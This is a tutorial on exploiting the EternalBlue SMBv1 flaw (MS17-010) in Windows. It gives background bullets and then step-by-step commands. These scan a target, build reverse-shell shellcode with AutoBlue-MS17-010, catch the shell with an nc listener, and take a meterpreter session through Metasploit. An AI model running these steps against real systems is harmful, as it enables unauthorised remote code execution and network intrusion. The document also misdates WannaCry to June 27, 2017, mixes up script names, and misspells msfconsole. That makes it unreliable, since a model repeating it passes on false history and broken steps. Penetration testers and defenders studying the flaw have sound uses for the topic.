# MS17-010 EternalBlue Exploit

- **EternalBlue (MS17-010/CVE-2017-0144)** is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

- The EternalBlue exploit was developed by the **NSA (National Security Agency)** to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the **Shadow Brokers** in 2017.

- The EternalBlue exploit takes advantage of a vulnerability in the Windows **SMBv1 protocol** that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

- The **EternalBlue** exploit was used in the **WannaCry** ransomware attack on **June 27, 2017** to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.

- This vulnerability affects multiple versions of Windows:
  - Windows Vista
  - Windows 7
  - Windows Server 2008
  - Windows 8.1
  - Windows Server 2012
  - Windows 10
  - Windows Server 2016
    
- Microsoft released a patch for the vulnerability in **March 2017**, however, many users and companies have still not yet patched their systems.

- The **EternalBlue exploit** has a **MSF auxiliary module** that can be used to check if a target system is vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.

- The **EternalBlue exploit module** can be used to exploit vulnerable Windows systems and consequently provide a **privileged meterpreter session** on the target system.

- In addition to MSF modules, we can also manually exploit the vulnerability by utilizing **publicly available exploit code**.
----
# Tools & Environment

- **AutoBlue-MS17-010**: [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
- **Target system**: Windows 
- **Penetration Testing distribution**: Kali Linux or Any linux
----

<h2>Pratically</h2>
Scan With Nmap
<code>sudo nmap -sV -p 445 -O {ip}</code>
or 
<code>sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 {ip}</code></br>
Now, Clone tool AutoBlue-MS17-010</br>
and Install it properly including requirements.txt</br>
then </br>
<code>cd shellcode</code></br>
<code>chmod +x shell_prep.sh</code></br>
<code>./shell_prep.sh</code></br>
It will ask (y/n): y</br>
LHOST: your IP</br>
LPORT: 1234 or any for both x64 x86</br>
then 1 and 1 for both options </br>
<h3>Setup nc listner</h3></br>
<code>nc -nvlp 1234</code></br>
Note: you can use exploit according to version of windows you are targetting Now i will target window7</br>
<span>If it has not executable permission then provide them </span></br>
<code>chmod +x eternalblue_exploit7.py</code></br>
<code>python eternalblue_exploit.py {ip} shellcode/sc_x64.bin</code></br>we can you X64 orX86 according to operationg system</br>

<h3>Exploiting this with metasploit</h3></br>
 <code>msfconlole</code></br>
 <code>search eternalblue</code></br>
 <code>use  exploit/windows/smb/ms17_010_eternalblue</code></br>
 <code>show options</code></br>
 <code>set RHOST {ip}</code></br>
 <code>exploit</code></br>
 now we will get meterpreter session

